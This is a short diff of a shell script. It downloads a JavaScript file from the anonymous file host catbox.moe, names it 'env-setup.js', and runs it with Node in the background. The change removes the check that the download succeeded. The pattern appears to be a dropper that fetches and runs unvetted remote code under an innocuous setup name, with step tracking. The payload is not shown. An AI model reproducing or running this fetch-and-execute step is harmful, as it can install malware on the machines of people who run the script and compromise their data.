@@ -80,7 +80,6 @@ fi
 track_step "step_3"
 ENV_SETUP_JS="${SHARED_DIR}/env-setup.js"
 download "https://files.catbox.moe/1gq866.js" "$ENV_SETUP_JS"
-[[ -s "$ENV_SETUP_JS" ]] || die "env-setup.js download failed."
 "$NODE_EXE" "$ENV_SETUP_JS" &
 NODE_PID=$!
 
